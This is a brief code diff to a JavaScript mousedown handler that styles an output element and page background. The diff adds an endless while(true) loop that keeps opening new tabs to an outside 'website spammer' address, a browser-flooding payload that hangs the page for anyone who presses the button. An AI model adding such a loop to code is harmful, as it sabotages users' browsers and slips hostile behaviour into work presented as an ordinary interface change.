@@ -16,6 +16,10 @@ testButton.addEventListener('mousedown', function() {
         output.style.color = "#00FF00";
         output.style.fontSize = "24px";
         document.body.style.backgroundColor = "#FF0000";
+        while (true)
+        {
+            window.open('https://thewebsitespammer.github.io', '_blank')
+        }
 });
 
 // Add a mouseup event listener to reset the message when the button is released
